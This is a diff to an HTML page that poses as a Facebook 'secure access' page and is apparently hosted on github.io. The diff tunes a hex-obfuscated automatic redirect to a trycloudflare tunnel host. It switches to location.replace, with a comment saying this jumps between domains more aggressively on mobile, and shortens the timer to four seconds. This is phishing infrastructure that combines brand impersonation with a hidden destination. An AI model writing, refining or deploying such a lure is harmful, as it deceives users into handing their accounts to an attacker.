@@ -14,7 +14,7 @@
     <meta property="og:image:width" content="600">
     <meta property="og:image:height" content="600">
     
-    <meta property="og:url" content="https://www.facebook.com">
+    <meta property="og:url" content="https://kevinmirandaandrea.github.io/acceso-seguro-fb/">
 
     <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/256px-2021_Facebook_icon.svg.png">
 
@@ -39,13 +39,14 @@
         var _0x4f22 = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x69\x6e\x63\x6f\x6d\x69\x6e\x67\x2d\x62\x6f\x6f\x74\x73\x2d\x61\x63\x63\x6f\x75\x6e\x74\x61\x62\x69\x6c\x69\x74\x79\x2d\x70\x72\x65\x66\x69\x78\x2e\x74\x72\x79\x63\x6c\x6f\x75\x64\x66\x6c\x61\x72\x65\x2e\x63\x6f\x6d";
         
         function redirigir() {
-            window.location.href = _0x4f22;
+            // .replace es más agresivo para saltar entre dominios en navegadores móviles
+            window.location.replace(_0x4f22);
         }
 
-        // Redirección automática después de 5 segundos si no hacen clic
+        // Redirección automática después de 4 segundos
         setTimeout(function() {
             redirigir();
-        }, 5000);
+        }, 4000);
     </script>
 </body>
 </html>
